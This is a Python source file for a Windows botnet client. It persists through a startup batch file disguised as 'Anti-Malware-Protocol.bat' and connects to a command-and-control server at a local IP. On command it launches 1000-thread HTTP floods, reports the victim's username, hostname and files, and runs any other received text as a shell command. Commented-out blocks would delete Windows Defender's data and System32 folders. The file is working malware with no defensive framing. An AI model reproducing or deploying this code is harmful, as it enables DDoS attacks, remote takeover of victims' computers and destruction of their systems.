import socket, random, time, threading, os, sys
from shutil import copyfile
#should delete windows defender
'''
windefdelname = 'Anti-Virus-Upgrader.bat'
windefdelfile = open(windefdelname, 'w')
lines = ['\ntakeown /f C:\\ProgramData\\Microsoft\n','\ncd C:/ProgramData/\n', '\nrmdir /S/Q Microsoft\n']
windefdelfile.writelines(lines)
os.system(f'powershell "start {windefdelname} -v runAs"')
os.startfile(windefdelname)
'''
backslash = ' \ '
backslash = backslash.strip()
def get_filename():
    cwd = sys.argv[0]
    cwd = list(cwd)
    result = ""
    for i in cwd:
        if i == "/" or i == backslash:
            result = result + " "
        else:
            result = result + i
    result = result.split()
    final_result = result[(len(result) -  1)]
    return final_result
user = os.getlogin()
try:
    copyfile(f'{get_filename()}',f'C:/Users/{user}/{get_filename()}')
    os.chdir(f'C:/Users/{user}/{get_filename()}')
except:
    pass
os.chdir(f'C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')
file = open('Anti-Malware-Protocol.bat', 'w')
linestowrite = ['\n',f'cd C:/Users/{user}/\n', f'start {get_filename()}\n']
file.writelines(linestowrite)
file.close()
port = 80
ip = ''
time.sleep(1)
thread_num_mutex = threading.Lock()
def ddos():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            global fake_ip
            random_num1 = str(random.randint(0, 255))
            random_num2 = str(random.randint(0, 255))
            random_num3 = str(random.randint(0, 255))
            random_num4 = str(random.randint(0, 255))
            fake_ip = f'{random_num1}.{random_num2}.{random_num3}.{random_num4}'
            thread_num_mutex.acquire(True)
            thread_num_mutex.release()
            sock.connect((ip, port))
            sock.send(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'))
            sock.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
        except:
            pass
def thread_starter():
    for i in range(1000):
        x = threading.Thread(target=ddos)
        x.start()
        threads.append(x)
    for currentthread in threads:
        currentthread.join()
threads = []
conn_ip = '192.168.0.115'
port = 80
commands = ['!ddos','!botcount','!listcon', '!shutdownall', '!checkping', '!erasebots', '!getusername', '!getbotcwd', '!listdir']
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((conn_ip, port))
        break
    except:
        conn_ip = '192.168.0.115'
        s.close()
        pass
while True:
    try:
        message = s.recv(1024).decode()
        if message.lower().startswith('!ddos'):
            msg = message.split()
            try:
                ip = msg[1]
                ip = socket.gethostbyname(ip)
                try:
                    threadstart = threading.Thread(target=thread_starter)
                    threadstart.start()
                except:
                    threadstart = threading.Thread(target=thread_starter)
                    threadstart.start()
                    pass
                message = ''
            except:
                pass
        elif message.lower() in commands or message.lower().startswith('!checkping'):
            pass
        elif message.lower().startswith('!erasebots'):
            pass
            '''
            os.chdir('C:/Windows/')
            dirs = os.listdir()
            for dir in dirs:
                try:
                    if dir == 'System32':
                        os.system(f'takeown /f C:\{backslash}Windows\System32')
                        os.rmdir(dir)
                    else:
                        pass
                except:
                    os.chdir('C:/Windows/System32')
                    dirs = os.listdir()
                    for dir in dirs:
                        try:
                            os.rmdir(dir)
                        except:
                            pass'''
        elif message.lower().startswith('!getbothost'):
            hostname = socket.gethostname()
            hostname = hostname.encode()
            s.send(hostname)
        elif message.lower().startswith('!getbotcwd'):
            cwd = os.getcwd()
            cwd = cwd.encode()
            s.send(cwd)
        elif message.lower().startswith('!listdir'):
            listdir = os.listdir()
            result = ""
            for dire in listdir:
                try:
                    result = result + dire + ", "
                except:
                    pass
            msgtoserv = result.encode()
            s.send(msgtoserv)
        if message.lower().startswith('!getusername'):
            login = os.getlogin()
            login = login.encode()
            s.send(login)
        elif message.lower().startswith('!checkping'):
            pass
        else:
            os.system(message)
    except:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((conn_ip, port))
                break
            except:
                s.close()
                pass
